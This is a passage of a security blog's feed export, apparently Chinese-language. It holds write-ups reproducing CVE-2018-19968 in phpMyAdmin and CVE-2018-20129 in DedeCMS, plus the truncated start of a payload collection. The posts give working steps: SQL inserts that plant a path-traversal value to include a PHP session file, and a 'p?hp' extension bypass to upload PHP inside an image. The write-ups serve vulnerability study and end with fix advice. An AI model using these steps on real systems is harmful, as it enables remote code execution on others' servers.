class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">book</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">  alert(data.result.bookName);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">'https://m.zongheng.com/h5/ajax/chapter?bookId=195804&amp;chapterId=4210194_2&amp;callback=book'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/15/同源策略/5.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;最近挖洞总是遇到CORS之类的，索性就再次了解下同源策略&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="策略" scheme="http://yoursite.com/categories/%E7%AD%96%E7%95%A5/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin 4.8.0~4.8.3 任意文件包含/远程代码执行漏洞 (CVE-2018-19968)</title>
    <link href="http://yoursite.com/2019/02/11/CVE-2018-19968/"/>
    <id>http://yoursite.com/2019/02/11/CVE-2018-19968/</id>
    <published>2019-02-10T16:00:00.000Z</published>
    <updated>2019-02-11T11:52:42.933Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">不知不觉就咸鱼了一周(发出了断九幺的声音)，复现了下CVE-2018-19968，顺便分析下源码</font><br><a id="more"></a></p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><font color="dark">介绍</font></h3><ul><li>影响4.8.0~4.8.3版本</li><li>读取本地文件</li><li>需要登陆<br>适用于可以登陆PHPMyAdmin,但是无法限制了写入文件的情况</li></ul><h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a><font color="dark">详情</font></h3><p>漏洞产生于tbl_replace.php中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if some posted fields need to be transformed.</span></span><br><span class="line">$mime_map = Transformations::getMIME($GLOBALS[<span class="string">'db'</span>], $GLOBALS[<span class="string">'table'</span>]);</span><br><span class="line"><span class="keyword">if</span> ($mime_map === <span class="keyword">false</span>) &#123;</span><br><span class="line">    $mime_map = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$query_fields = <span class="keyword">array</span>();</span><br><span class="line">$insert_errors = <span class="keyword">array</span>();</span><br><span class="line">$row_skipped = <span class="keyword">false</span>;</span><br><span class="line">$unsaved_values = <span class="keyword">array</span>();</span><br><span class="line">[...]</span><br><span class="line">        <span class="comment">// Apply Input Transformation if defined</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($mime_map[$column_name])</span><br><span class="line">            &amp;&amp; !<span class="keyword">empty</span>($mime_map[$column_name][<span class="string">'input_transformation'</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            $filename = <span class="string">'libraries/classes/Plugins/Transformations/'</span></span><br><span class="line">                . $mime_map[$column_name][<span class="string">'input_transformation'</span>];</span><br><span class="line">            <span class="keyword">if</span> (is_file($filename)) &#123;</span><br><span class="line">                <span class="keyword">include_once</span> $filename;</span><br><span class="line">                $classname = Transformations::getClassName($filename);</span><br><span class="line">                <span class="comment">/** <span class="doctag">@var</span> IOTransformationsPlugin $transformation_plugin */</span></span><br><span class="line">                $transformation_plugin = <span class="keyword">new</span> $classname();</span><br><span class="line">                $transformation_options = Transformations::getOptions(</span><br><span class="line">                    $mime_map[$column_name][<span class="string">'input_transformation_options'</span>]</span><br><span class="line">                );</span><br><span class="line">                $current_value = $transformation_plugin-&gt;applyTransformation(</span><br><span class="line">                    $current_value, $transformation_options</span><br><span class="line">                );</span><br><span class="line">                <span class="comment">// check if transformation was successful or not</span></span><br><span class="line">                <span class="comment">// and accordingly set error messages &amp; insert_fail</span></span><br><span class="line">                <span class="keyword">if</span> (method_exists($transformation_plugin, <span class="string">'isSuccess'</span>)</span><br><span class="line">                    &amp;&amp; !$transformation_plugin-&gt;isSuccess()</span><br><span class="line">                ) &#123;</span><br><span class="line">                    $insert_fail = <span class="keyword">true</span>;</span><br><span class="line">                    $row_skipped = <span class="keyword">true</span>;</span><br><span class="line">                    $insert_errors[] = sprintf(</span><br><span class="line">                        __(<span class="string">'Row: %1$s, Column: %2$s, Error: %3$s'</span>),</span><br><span class="line">                        $rownumber, $column_name,</span><br><span class="line">                        $transformation_plugin-&gt;getError()</span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>注意其中的<code>include_once $filename;</code><br>而<code>$filename = &#39;libraries/classes/Plugins/Transformations/&#39;. $mime_map[$column_name][&#39;input_transformation&#39;];</code><br><strong>mime_map[$column_name][‘input_transformation’];</strong>又来自于<br><code>$mime_map = Transformations::getMIME($GLOBALS[&#39;db&#39;], $GLOBALS[&#39;table&#39;]);</code></p><p>getMIME则是<code>libraries/classes/Transformations.php</code>的一个方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">($db, $table, $strict = false, $fullName = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $relation = <span class="keyword">new</span> Relation();</span><br><span class="line">    $cfgRelation = $relation-&gt;getRelationsParam();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! $cfgRelation[<span class="string">'mimework'</span>]) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $com_qry = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> ($fullName) &#123;</span><br><span class="line">        $com_qry .= <span class="string">"SELECT CONCAT("</span></span><br><span class="line">            . <span class="string">"`db_name`, '.', `table_name`, '.', `column_name`"</span></span><br><span class="line">            . <span class="string">") AS column_name, "</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $com_qry  = <span class="string">"SELECT `column_name`, "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $com_qry .= <span class="string">'`mimetype`,</span></span><br><span class="line"><span class="string">                `transformation`,</span></span><br><span class="line"><span class="string">                `transformation_options`,</span></span><br><span class="line"><span class="string">                `input_transformation`,</span></span><br><span class="line"><span class="string">                `input_transformation_options`</span></span><br><span class="line"><span class="string">         FROM '</span> . Util::backquote($cfgRelation[<span class="string">'db'</span>]) . <span class="string">'.'</span></span><br><span class="line">        . Util::backquote($cfgRelation[<span class="string">'column_info'</span>]) . <span class="string">'</span></span><br><span class="line"><span class="string">         WHERE `db_name`    = \''</span> . $GLOBALS[<span class="string">'dbi'</span>]-&gt;escapeString($db) . <span class="string">'\'</span></span><br><span class="line"><span class="string">           AND `table_name` = \''</span> . $GLOBALS[<span class="string">'dbi'</span>]-&gt;escapeString($table) . <span class="string">'\'</span></span><br><span class="line"><span class="string">           AND ( `mimetype` != \'\''</span> . (!$strict ? <span class="string">'</span></span><br><span class="line"><span class="string">              OR `transformation` != \'\'</span></span><br><span class="line"><span class="string">              OR `transformation_options` != \'\'</span></span><br><span class="line"><span class="string">              OR `input_transformation` != \'\'</span></span><br><span class="line"><span class="string">              OR `input_transformation_options` != \'\''</span> : <span class="string">''</span>) . <span class="string">')'</span>;</span><br><span class="line">    $result = $GLOBALS[<span class="string">'dbi'</span>]-&gt;fetchResult(</span><br><span class="line">        $com_qry, <span class="string">'column_name'</span>, <span class="keyword">null</span>, DatabaseInterface::CONNECT_CONTROL</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $column =&gt; $values) &#123;</span><br><span class="line">        <span class="comment">// convert mimetype to new format (f.e. Text_Plain, etc)</span></span><br><span class="line">        $delimiter_space = <span class="string">'- '</span>;</span><br><span class="line">        $delimiter = <span class="string">"_"</span>;</span><br><span class="line">        $values[<span class="string">'mimetype'</span>] = <span class="keyword">self</span>::fixupMIME($values[<span class="string">'mimetype'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// For transformation of form</span></span><br><span class="line">        <span class="comment">// output/image_jpeg__inline.inc.php</span></span><br><span class="line">        <span class="comment">// extract dir part.</span></span><br><span class="line">        $dir = explode(<span class="string">'/'</span>, $values[<span class="string">'transformation'</span>]);</span><br><span class="line">        $subdir = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (count($dir) === <span class="number">2</span>) &#123;</span><br><span class="line">            $subdir = ucfirst($dir[<span class="number">0</span>]) . <span class="string">'/'</span>;</span><br><span class="line">            $values[<span class="string">'transformation'</span>] = $dir[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $values[<span class="string">'transformation'</span>] = <span class="keyword">self</span>::fixupMIME($values[<span class="string">'transformation'</span>]);</span><br><span class="line">        $values[<span class="string">'transformation'</span>] = $subdir . $values[<span class="string">'transformation'</span>];</span><br><span class="line">        $result[$column] = $values;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从<code>$values[&#39;transformation&#39;] = $subdir . $values[&#39;transformation&#39;];</code>知道<code>mime_map[$column_name][&#39;input_transformation&#39;]= $subdir . $values[&#39;transformation&#39;]</code><br>而$value则是来自于$result<br><code>$result = $GLOBALS[&#39;dbi&#39;]-&gt;fetchResult($com_qry, &#39;column_name&#39;, null, DatabaseInterface::CONNECT_CONTROL);</code><br>执行的sql语句是<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">`column_name`</span>, <span class="string">`mimetype`</span>, <span class="string">`transformation`</span>, <span class="string">`transformation_options`</span>, <span class="string">`input_transformation`</span>, <span class="string">`input_transformation_options`</span> <span class="keyword">FROM</span> <span class="string">`db_name`</span>.<span class="string">`pma__column_info`</span> <span class="keyword">WHERE</span> <span class="string">`db_name`</span> = <span class="string">'db_name'</span> <span class="keyword">AND</span> <span class="string">`table_name`</span> = <span class="string">'table_name'</span> <span class="keyword">AND</span> ( <span class="string">`mimetype`</span> != <span class="string">''</span> <span class="keyword">OR</span> <span class="string">`transformation`</span> != <span class="string">''</span> <span class="keyword">OR</span> <span class="string">`transformation_options`</span> != <span class="string">''</span> <span class="keyword">OR</span> <span class="string">`input_transformation`</span> != <span class="string">''</span> <span class="keyword">OR</span> <span class="string">`input_transformation_options`</span> != <span class="string">''</span>)</span><br></pre></td></tr></table></figure></p><p>创建一个表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> foo;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> foo.bar ( baz <span class="built_in">VARCHAR</span>(<span class="number">100</span>) PRIMARY <span class="keyword">KEY</span> );</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> foo.bar <span class="keyword">SELECT</span> <span class="string">'&lt;?php phpinfo(); ?&gt;'</span>;</span><br></pre></td></tr></table></figure></p><p>向pma__column_info中插入数据<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pma__column_info <span class="keyword">SELECT</span> <span class="string">'1'</span>, <span class="string">'foo'</span>, <span class="string">'bar'</span>, <span class="string">'baz'</span>, <span class="string">'plop'</span>,<span class="string">'plop'</span>, <span class="string">'plop'</span>, <span class="string">'plop'</span>,</span><br><span class="line"><span class="string">'../../../../../../../../test'</span>,<span class="string">'plop'</span>;</span><br></pre></td></tr></table></figure></p><p>查询结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT `column_name`, `mimetype`, `transformation`, `transformation_options`, `input_transformation`, `input_transformation_options` FROM `foo`.`pma__column_info` WHERE `db_name` = <span class="string">'foo'</span> AND `table_name` = <span class="string">'bar'</span> AND ( `mimetype` != <span class="string">''</span> OR `transformation` != <span class="string">''</span> OR `transformation_options` != <span class="string">''</span> OR `input_transformation` != <span class="string">''</span> OR `input_transformation_options` != <span class="string">''</span>);</span><br><span class="line">+-------------+----------+----------------+------------------------+--------------------------------------+------------------------------+</span><br><span class="line">| column_name | mimetype | transformation | transformation_options | input_transformation                 | input_transformation_options |</span><br><span class="line">+-------------+----------+----------------+------------------------+--------------------------------------+------------------------------+</span><br><span class="line">| baz         | plop     | plop           | plop                   | ../../../../../../../../<span class="built_in">test</span> | plop                         |</span><br><span class="line">+-------------+----------+----------------+------------------------+--------------------------------------+------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>这样filename就是<code>libraries/classes/Plugins/Transformations/../../../../../../../../test</code><br>如果test文件存在就会被包含</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a><font color="dark">复现</font></h3><p>创建一个表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> foo;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> foo.bar ( baz <span class="built_in">VARCHAR</span>(<span class="number">100</span>) PRIMARY <span class="keyword">KEY</span> );</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> foo.bar <span class="keyword">SELECT</span> <span class="string">'&lt;?php phpinfo(); ?&gt;'</span>;</span><br></pre></td></tr></table></figure></p><p>指定文件为session文件<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pma__column_infoSELECT <span class="string">'1'</span>, <span class="string">'foo'</span>, <span class="string">'bar'</span>, <span class="string">'baz'</span>, <span class="string">'plop'</span>,<span class="string">'plop'</span>, <span class="string">'plop'</span>, <span class="string">'plop'</span>,</span><br><span class="line"><span class="string">'../../../../../../../../tmp/sess_***'</span>,<span class="string">'plop'</span>;</span><br></pre></td></tr></table></figure></p><p>其中<code>***</code>为Cookie中PhPmyadmin的值<br>之后访问<br><code>http://localhost/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[multi_edit][][]=baz&amp;clause_is_unique=1</code><br>即可看到phpinfo</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a><font color="dark">修复</font></h3><ul><li>更新为最新版本</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;不知不觉就咸鱼了一周(发出了断九幺的声音)，复现了下CVE-2018-19968，顺便分析下源码&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-20129 织梦V5.7 SP2前台鸡肋文件上传getshell</title>
    <link href="http://yoursite.com/2019/02/03/CVE-2018-20129%20DedeCMS%20V5.7%20SP2%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/"/>
    <id>http://yoursite.com/2019/02/03/CVE-2018-20129 DedeCMS V5.7 SP2前台文件上传getshell/</id>
    <published>2019-02-02T16:00:00.000Z</published>
    <updated>2019-02-03T06:55:11.086Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">抱大佬大腿的第一天，今日要做的事情是复现下CVE-2018-20129，也就是DedeCMS V5.7SP2 的一处通过文件上传get shell</font><br><a id="more"></a></p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><font color="dark">介绍</font></h3><p>此漏洞限制很大。</p><ul><li>需要管理员权限</li><li>需要开启会员功能<br>也就是说虽然是前台getshell但是需要有<strong>后台权限</strong></li></ul><h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a><font color="dark">详情</font></h3><p>漏洞产生于/include/dialog/select_images_post.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/config.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/../image.func.php"</span>);</span><br></pre></td></tr></table></figure></p><p>看下<strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检验用户登录状态</span></span><br><span class="line">$cuserLogin = <span class="keyword">new</span> userLogin();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($cuserLogin-&gt;getUserID() &lt;=<span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($adminDirHand))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"&lt;b&gt;提示：需输入后台管理目录才能登录&lt;/b&gt;&lt;br /&gt;&lt;form&gt;请输入后台管理目录名：&lt;input type='hidden' name='gotopage' value='"</span>.urlencode($dedeNowurl).<span class="string">"' /&gt;&lt;input type='text' name='adminDirHand' value='dede' style='width:120px;' /&gt;&lt;input style='width:80px;' type='submit' name='sbt' value='转入登录' /&gt;&lt;/form&gt;"</span>, <span class="string">"javascript:;"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">$adminDirHand = HtmlReplace($adminDirHand, <span class="number">1</span>);</span><br><span class="line">    $gurl = <span class="string">"../../&#123;$adminDirHand&#125;/login.php?gotopage="</span>.urlencode($dedeNowurl);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script language='javascript'&gt;location='$gurl';&lt;/script&gt;"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会先检验用户登录状态，必须要是后台管理员</p><p>同时config.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/../common.inc.php"</span>);</span><br></pre></td></tr></table></figure></p><p>而common.inc.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转换上传的文件相关的变量及安全处理、并引用前台通用的上传函数</span></span><br><span class="line"><span class="keyword">if</span>($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">'/uploadsafe.inc.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>uploadsafe.inc.php中含有用来处理文件相关的函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$cfg_not_allowall = <span class="string">"php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml"</span>;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($&#123;$_key.<span class="string">'_name'</span>&#125;) &amp;&amp; (preg_match(<span class="string">"#\.("</span>.$cfg_not_allowall.<span class="string">")$#i"</span>,$&#123;$_key.<span class="string">'_name'</span>&#125;) || !preg_match(<span class="string">"#\.#"</span>, $&#123;$_key.<span class="string">'_name'</span>&#125;)) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!defined(<span class="string">'DEDEADMIN'</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'Not Admin Upload filetype not allow !'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上传的文件的后缀名不能是$cfg_not_allowall中的这些</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$imgfile_name = trim(preg_replace(<span class="string">"#[ \r\n\t\*\%\\\/\?&gt;&lt;\|\":]&#123;1,&#125;#"</span>, <span class="string">''</span>, $imgfile_name));</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"#\.("</span>.$cfg_imgtype.<span class="string">")#i"</span>, $imgfile_name))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">"你所上传的图片类型不在许可列表，请更改系统对扩展名限定的配置！"</span>, <span class="string">"-1"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码表示<em>$imgfile_name</em>的一些特殊符号会先被去掉,在限制了php的情况下可以使用p?hp之类的后缀进行绕过，并且$imgfile_name中必须有.jpg,.png之类的</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sparr = <span class="keyword">Array</span>(<span class="string">"image/pjpeg"</span>, <span class="string">"image/jpeg"</span>, <span class="string">"image/gif"</span>, <span class="string">"image/png"</span>, <span class="string">"image/xpng"</span>, <span class="string">"image/wbmp"</span>);</span><br><span class="line">$imgfile_type = strtolower(trim($imgfile_type));</span><br><span class="line"><span class="keyword">if</span>(!in_array($imgfile_type, $sparr))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">"上传的图片格式错误，请使用JPEG、GIF、PNG、WBMP格式的其中一种！"</span>,<span class="string">"-1"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码表示<strong>Content-Type</strong>必须是<strong>$sparr</strong>中的类型</p><hr><ul><li>如果网站配置<strong>AddType application/x-httpd-php .phtml</strong>之类的可以采用.phtml绕过后缀名限制</li><li>因为<em>?</em> <em>&lt;</em> <em>&gt;</em> 等字符会被过滤，所以也可以以使用.p?hp的形式绕过 </li></ul><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a><font color="dark">复现</font></h3><p>首先在后台打开会员功能，同时把注册审核给关了，方便注册<br><img src="/2019/02/03/CVE-2018-20129 DedeCMS V5.7 SP2前台文件上传getshell/1.png" alt><br>然后注册一个新账号，进入发表文章界面<br><img src="/2019/02/03/CVE-2018-20129 DedeCMS V5.7 SP2前台文件上传getshell/2.png" alt><br>点击下方的按钮后选择上传<br><img src="/2019/02/03/CVE-2018-20129 DedeCMS V5.7 SP2前台文件上传getshell/3.png" alt><br>修改后缀名为<strong>a.gif.p?hp</strong>,同时讲图片内容中加上<em>&lt;?php phpinfo();?&gt;</em><br><img src="/2019/02/03/CVE-2018-20129 DedeCMS V5.7 SP2前台文件上传getshell/4.png" alt><br>进行访问<br><img src="/2019/02/03/CVE-2018-20129 DedeCMS V5.7 SP2前台文件上传getshell/5.png" alt></p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a><font color="dark">修复</font></h3><ul><li>关闭会员功能</li><li>采用白名单</li><li>改进扩展名判断</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;抱大佬大腿的第一天，今日要做的事情是复现下CVE-2018-20129，也就是DedeCMS V5.7SP2 的一处通过文件上传get shell&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Payload收集</title>
    <link href="http://yoursite.com/2019/02/02/Payload%E6%94%B6%E9%9B%86/"/>
    <id>http://yoursite.com/2019/02/02/Payload收集/</id>
    <published>2019-02-01T16:00:00.000Z</published>
    <updated>2019-02-02T12:05:15.030Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">先收集一波Payload</font><br><a id="more"></a></p><h3 id="扩展名"><a href="#扩展名" class="headerlink" title="扩展名"></a><font color="green">扩展名</font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 